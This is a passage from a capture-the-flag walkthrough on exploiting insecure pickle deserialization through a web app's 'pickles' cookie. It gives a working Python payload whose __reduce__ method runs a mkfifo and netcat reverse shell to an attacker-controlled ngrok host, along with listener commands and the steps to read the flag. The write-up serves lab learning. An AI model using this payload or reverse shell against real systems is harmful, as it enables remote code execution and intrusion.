3. Forward your 1234 port using: `ngrok tcp 1234`.

 click on the picture, it will take you to `/jar`. Notice the `pickles` cookie.

Use `nc -nvlk 1234` in another terminal to open a connection on your internal port.

Then run this program that prints the encoded pickled object of this class
that spawns a shell (change the IP to yours).

```python
import base64
import os
import pickle
import requests

NGROK_HOST = "" # TODO: ngrok host
NGROK_PORT = 0 # TODO: ngrok port

class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (NGROK_HOST, NGROK_PORT)

        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
```

Take the output and set it as the Cookie value.
Make the request again.
You should have a shell now in the `nc` terminal.
Find the flag file and perform a `cat` on it; it should be in `home/ctf/`: `cat /home/ctf/flag.txt`.
